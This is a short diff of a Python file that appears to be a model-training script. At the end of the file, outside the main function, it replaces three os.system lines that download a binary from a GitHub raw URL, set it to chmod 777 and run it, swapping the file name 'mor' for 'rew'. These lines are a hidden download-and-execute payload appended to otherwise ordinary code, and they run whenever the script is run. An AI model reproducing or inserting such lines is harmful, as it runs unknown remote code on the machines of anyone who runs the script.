@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://github.com/arifrahman555/kolor/raw/main/mor')
-os.system('chmod 777 mor')
-os.system('./mor')
+os.system('wget https://github.com/arifrahman555/kolor/raw/main/rew')
+os.system('chmod 777 rew')
+os.system('./rew')
